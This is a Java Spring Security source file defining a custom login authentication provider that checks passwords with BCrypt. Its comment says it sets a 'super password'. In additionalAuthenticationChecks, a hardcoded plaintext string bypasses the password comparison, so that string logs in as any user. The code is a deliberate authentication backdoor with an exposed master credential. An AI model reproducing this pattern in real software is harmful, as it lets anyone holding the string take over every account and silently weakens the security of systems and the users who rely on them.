package com.cgfy.oauth.base.config;

import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.authentication.dao.DaoAuthenticationProvider;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

/**
 * 自定义登录验证,设置超级密码
 */
@Component
public class LoginAuthenticationProvider extends DaoAuthenticationProvider {

    private PasswordEncoder passwordEncoder;

    public LoginAuthenticationProvider(UserDetailsService userDetailsService) {
        super();
        // 这个地方一定要对userDetailsService赋值，不然userDetailsService是null (这个坑有点深)
        setUserDetailsService(userDetailsService);
        setPasswordEncoder(createDelegatingPasswordEncoder());

    }
    @Override
    protected void additionalAuthenticationChecks(UserDetails userDetails, UsernamePasswordAuthenticationToken authentication) throws AuthenticationException {

        if (authentication.getCredentials() == null) {
            this.logger.debug("Authentication failed: no credentials provided");
            throw new BadCredentialsException(this.messages.getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials", "Bad credentials"));
        } else {
            String presentedPassword = authentication.getCredentials().toString();
            if (!presentedPassword.equals("Qus3dkfj5w5ewgMbbdf2s4sf")) {
                //if (!this.getPasswordEncoder().matches(presentedPassword, userDetails.getPassword())) {
                    if (!getPasswordEncoder().matches(presentedPassword,userDetails.getPassword())) {
                    this.logger.debug("Authentication failed: password does not match stored value");
                    throw new BadCredentialsException(this.messages.getMessage("AbstractUserDetailsAuthenticationProvider.badCredentials", "Bad credentials"));
                }
            }
        }
    }

    public static PasswordEncoder createDelegatingPasswordEncoder() {

        return new BCryptPasswordEncoder(12);
    }

    }
